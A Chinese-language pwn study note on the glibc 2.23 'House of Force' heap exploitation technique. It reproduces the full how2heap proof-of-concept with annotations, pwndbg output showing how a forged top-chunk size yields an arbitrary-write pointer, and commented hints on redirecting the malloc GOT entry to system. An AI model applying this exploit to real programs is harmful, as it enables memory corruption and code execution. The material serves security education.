## House of Force

**本篇内容基于how2heap里面glibc-2.23版本下house_of_force.c**

### 机制讲解：
* **house of force主要利用的是伪造top chunk的size，在后续malloc过程中分配到在目标地址上伪造的chunk，从而拿到任意写目标地址的权限**

* 下面我们来配合代码走一遍流程：
```c
// how2heap/glibc_2.23/house_of_force.c
/*

   This PoC works also with ASLR enabled.
   It will overwrite a GOT entry so in order to apply exactly this technique RELRO must be disabled.
   If RELRO is enabled you can always try to return a chunk on the stack as proposed in Malloc Des Maleficarum 
   ( http://phrack.org/issues/66/10.html )

   Tested in Ubuntu 14.04, 64bit, Ubuntu 18.04

*/


#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>
#include <assert.h>

char bss_var[] = "This is a string that we want to overwrite.";  // 这是我们想要拿到的目标地址

int main(int argc , char* argv[])
{
	fprintf(stderr, "\nWelcome to the House of Force\n\n");
	fprintf(stderr, "The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\n");
	fprintf(stderr, "The top chunk is a special chunk. Is the last in memory "
		"and is the chunk that will be resized when malloc asks for more space from the os.\n");

	fprintf(stderr, "\nIn the end, we will use this to overwrite a variable at %p.\n", bss_var);
	fprintf(stderr, "Its current value is: %s\n", bss_var);



	fprintf(stderr, "\nLet's allocate the first chunk, taking space from the wilderness.\n");
	intptr_t *p1 = malloc(256);
	fprintf(stderr, "The chunk of 256 bytes has been allocated at %p.\n", p1 - 2);

	fprintf(stderr, "\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\n");
	int real_size = malloc_usable_size(p1);
	fprintf(stderr, "Real size (aligned and all that jazz) of our allocated chunk is %ld.\n", real_size + sizeof(long)*2);

	fprintf(stderr, "\nNow let's emulate a vulnerability that can overwrite the header of the Top Chunk\n");

	//----- VULNERABILITY ----
	intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size - sizeof(long)); // 这里为什么要在用户区指针加上用户区大小之后再减一个8字节呢，因为最后的8字节是和下一个chunk，也就是和top chunk的prev size域共用的，所以最后减去8字节回到top chunk的位置。
	fprintf(stderr, "\nThe top chunk starts at %p\n", ptr_top);

	fprintf(stderr, "\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n");
	fprintf(stderr, "Old size of top chunk %#llx\n", *((unsigned long long int *)((char *)ptr_top + sizeof(long))));
	*(intptr_t *)((char *)ptr_top + sizeof(long)) = -1; // 把top chunk的size域改成一个非常大的数，这样会让系统造成误判，以为top chunk空间足够大，可以任意分配大小chunk
	fprintf(stderr, "New size of top chunk %#llx\n", *((unsigned long long int *)((char *)ptr_top + sizeof(long))));
	//------------------------

	fprintf(stderr, "\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\n"
	   "Next, we will allocate a chunk that will get us right up against the desired region (with an integer\n"
	   "overflow) and will then be able to allocate a chunk right over the desired region.\n");

	/*
	 * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):
	 * new_top = old_top + nb 我们的目标是在new top的用户区指针这里拿到目标地址
	 * nb = new_top - old_top 所以nb里面包含的是中间辅助请求的chunk大小再加上这个chunk的头部大小，即一个完整chunk的大小
	 * req + 2sizeof(long) = new_top - old_top
	 * req = new_top - old_top - 2sizeof(long)
	 * req = dest - 2sizeof(long) - old_top - 2sizeof(long) 我们拿到的用户区指针实际上减去两个8字节就到new top了
	 * req = dest - old_top - 4*sizeof(long) 所以最后evil size得改成 目标地址-旧的top chunk地址-4个8字节
	 */
	unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top;
	fprintf(stderr, "\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n"
	   "we will malloc %#lx bytes.\n", bss_var, ptr_top, evil_size);
	void *new_ptr = malloc(evil_size); // 第一个malloc，通过请求evil size，让top chunk指针指到new top这里
	fprintf(stderr, "As expected, the new pointer is at the same place as the old top chunk: %p\n", new_ptr - sizeof(long)*2); // 这个chunk-2个8字节就是老的top chunk位置

	void* ctr_chunk = malloc(100); // 最后随便malloc一下，就可以拿到目标地址指针了
	fprintf(stderr, "\nNow, the next chunk we overwrite will point at our target buffer.\n");
	fprintf(stderr, "malloc(100) => %p!\n", ctr_chunk);
	fprintf(stderr, "Now, we can finally overwrite that value:\n");

	fprintf(stderr, "... old string: %s\n", bss_var);
	fprintf(stderr, "... doing strcpy overwrite with \"YEAH!!!\"...\n");
	strcpy(ctr_chunk, "YEAH!!!");
	fprintf(stderr, "... new string: %s\n", bss_var);

	assert(ctr_chunk == bss_var);


	// some further discussion: 下面的讨论是实战技巧，把目标地址换成malloc的got地址，这样就可以把malloc换成其他函数，比如system
	//fprintf(stderr, "This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\n\n");
	//fprintf(stderr, "This because the main_arena->top pointer is setted to current av->top + malloc_size "
	//	"and we \nwant to set this result to the address of malloc_got_address-8\n\n");
	//fprintf(stderr, "In order to do this we have malloc_got_address-8 = p2_guessed + evil_size\n\n");
	//fprintf(stderr, "The av->top after this big malloc will be setted in this way to malloc_got_address-8\n\n");
	//fprintf(stderr, "After that a new call to malloc will return av->top+8 ( +8 bytes for the header ),"
	//	"\nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_address\n\n");

	//fprintf(stderr, "The large chunk with evil_size has been allocated here 0x%08x\n",p2);
	//fprintf(stderr, "The main_arena value av->top has been setted to malloc_got_address-8=0x%08x\n",malloc_got_address);

	//fprintf(stderr, "This last malloc will be served from the remainder code and will return the av->top+8 injected before\n");
}
```

* **配合gdb来断点调试一下**
1. 先看看malloc一个块时的情况
```bash
pwndbg> b 42
Breakpoint 2 at 0x55555555533f: file glibc_2.23/house_of_force.c, line 43.
pwndbg> c
Continuing.

Welcome to the House of Force

The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.
The top chunk is a special chunk. Is the last in memory and is the chunk that will be resized when malloc asks for more space from the os.

In the end, we will use this to overwrite a variable at 0x555555558020. // 这是我们的目标地址，一个在bss段上面的地址
Its current value is: This is a string that we want to overwrite.

Let's allocate the first chunk, taking space from the wilderness.
The chunk of 256 bytes has been allocated at 0x555555559000.  // 我们malloc到的chunk的真实地址

Now the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.
Real size (aligned and all that jazz) of our allocated chunk is 280. // 280=256+8*2+8，最后这个8来自于top chunk的prev size域

pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555559000
Size: 0x110 (with flag bits: 0x111)

Top chunk | PREV_INUSE 当上一个chunk还在使用时，当前chunk当prev size域是供给给上一个块作为用户区使用的
Addr: 0x555555559110
Size: 0x20ef0 (with flag bits: 0x20ef1)
```

2. 把top chunk的size改掉，改成非常大的数，这样系统就会一直从当前top里面切割出来块了
```bash
pwndbg> b 58
Breakpoint 3 at 0x55555555543f: file glibc_2.23/house_of_force.c, line 68.
pwndbg> c
Continuing.

Now let's emulate a vulnerability that can overwrite the header of the Top Chunk

The top chunk starts at 0x555555559110

Overwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.
Old size of top chunk 0x20ef1
New size of top chunk 0xffffffffffffffff

The size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.
Next, we will allocate a chunk that will get us right up against the desired region (with an integer
overflow) and will then be able to allocate a chunk right over the desired region.

pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555559000
Size: 0x110 (with flag bits: 0x111)

Top chunk | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENA
Addr: 0x555555559110
Size: 0xfffffffffffffff8 (with flag bits: 0xffffffffffffffff) 可以看到大小已经被改成一个极大的数了，这其实算是整数溢出，size默认是无符号整数，-1进来直接成最大的无符号整数了
```

3. malloc一个evil size，使top指针走到目标指针上方16字节处，方便下一次malloc直接拿到目标地址
```bash
pwndbg> b 74
Breakpoint 4 at 0x5555555554bb: file glibc_2.23/house_of_force.c, line 74.
pwndbg> c
Continuing.

The value we want to write to at 0x555555558020, and the top chunk is at 0x555555559110, so accounting for the header size,
we will malloc 0xffffffffffffeef0 bytes.
As expected, the new pointer is at the same place as the old top chunk: 0x555555559110
```

4. 最后malloc一下，就可以从top上面分割出来，成功拿到指向目标地址的指针
```bash
pwndbg> b 77
Breakpoint 5 at 0x55555555550e: file glibc_2.23/house_of_force.c, line 77.
pwndbg> c
Continuing.

Now, the next chunk we overwrite will point at our target buffer.
malloc(100) => 0x555555558020! 成功拿到目标地址
```

5. 可以看到我们可以任意写目标地址了
```bash
pwndbg> b 83
pwndbg> c
Now, we can finally overwrite that value:
... old string: This is a string that we want to overwrite.
... doing strcpy overwrite with "YEAH!!!"...
... new string: YEAH!!! 把字符串里面的内容改成YEAH！！！了
```

* **因为house of force只涉及到malloc的操作，所以glibc-2.26版本及之后就算引入tcache，也不会影响该机制的利用**
* **本质上该机制的利用还是得需要堆溢出漏洞利用**

### 有关练习